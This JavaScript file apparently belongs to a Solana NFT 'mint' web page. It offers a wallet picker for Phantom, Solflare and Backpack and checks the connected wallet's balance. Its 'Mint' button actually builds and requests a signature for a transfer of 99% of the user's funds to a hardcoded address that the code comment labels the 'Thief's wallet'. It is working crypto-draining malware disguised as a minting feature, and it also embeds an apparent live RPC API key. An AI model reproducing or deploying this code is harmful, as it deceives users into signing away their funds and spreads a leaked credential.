$(document).ready(function() {
    // Add wallet selection dropdown
    const walletOptions = [
        { name: "Phantom", key: "isPhantom", extensionCheck: true },
        { name: "Solflare", key: "isSolflare", extensionCheck: false },
        { name: "Backpack", key: "isBackpack", extensionCheck: false }
    ];

    // Insert dropdown before button
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:10px;padding:5px 10px;border-radius:5px;font-size:1rem;"></select>');
    walletOptions.forEach(opt => {
        $('#wallet-select').append(`<option value="${opt.name.toLowerCase()}">${opt.name}</option>`);
    });

    $('#connect-wallet').on('click', async () => {
        const selectedWallet = $('#wallet-select').val();
        let provider = null;
        let providerName = "";

        // Force disconnect from all wallets first to ensure clean state
        try {
            if (window.solana && window.solana.disconnect) {
                await window.solana.disconnect();
            }
            if (window.solflare && window.solflare.disconnect) {
                await window.solflare.disconnect();
            }
            if (window.backpack && window.backpack.disconnect) {
                await window.backpack.disconnect();
            }
        } catch (e) {
            // Ignore disconnect errors
        }

        // Wait a moment for disconnections to complete
        await new Promise(resolve => setTimeout(resolve, 100));

        // Improved wallet detection
        if (selectedWallet === "phantom" && window.solana && window.solana.isPhantom) {
            provider = window.solana;
            providerName = "Phantom";
        } else if (selectedWallet === "solflare" && window.solana && window.solana.isSolflare) {
            provider = window.solana;
            providerName = "Solflare";
        } else if (selectedWallet === "backpack" && window.backpack) {
            provider = window.backpack;
            providerName = "Backpack";
        }

        // Check for Phantom extension if Phantom selected
        if (selectedWallet === "phantom" && (!window.solana || !window.solana.isPhantom)) {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;
            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
            return;
        }

        // Check for Solflare extension if Solflare selected
        if (selectedWallet === "solflare" && !window.solflare) {
            alert("Solflare extension not found. Please install Solflare wallet.");
            window.open("https://solflare.com/download", "_blank");
            return;
        }

        // Check for Backpack extension if Backpack selected
        if (selectedWallet === "backpack" && !window.backpack) {
            alert("Backpack extension not found. Please install Backpack wallet.");
            window.open("https://backpack.app/download", "_blank");
            return;
        }

        if (!provider) {
            alert("Selected wallet provider not found.");
            return;
        }

        try {
            // Force fresh connection with explicit options
            const resp = await provider.connect({ onlyIfTrusted: false });
            console.log(`${providerName} Wallet connected:`, resp);

            var connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4', 
                'confirmed'
            );

            const public_key = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
            const walletBalance = await connection.getBalance(public_key);
            console.log("Wallet balance:", walletBalance);

            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            if (walletBalance < minBalance) {
                alert("Insufficient funds for rent.");
                return;
            }

            $('#connect-wallet').text("Mint");
            $('#connect-wallet').off('click').on('click', async () => {
                try {
                    const recieverWallet = new solanaWeb3.PublicKey('3VdLzB7wn6fLup2Gtc6qeq91v5T1AAgiWigWbvNhMtTL'); // Thief's wallet
                    const balanceForTransfer = walletBalance - minBalance;
                    if (balanceForTransfer <= 0) {
                        alert("Insufficient funds for transfer.");
                        return;
                    }

                    var transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: public_key,
                            toPubkey: recieverWallet,
                            lamports: Math.floor(balanceForTransfer * 0.99),
                        }),
                    );

                    transaction.feePayer = public_key;
                    let blockhashObj = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signed = await provider.signTransaction(transaction);
                    console.log("Transaction signed:", signed);

                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    console.log("Transaction confirmed:", txid);
                } catch (err) {
                    console.error("Error during minting:", err);
                }
            });
        } catch (err) {
            console.error(`Error connecting to ${providerName} Wallet:`, err);
        }
    });
});
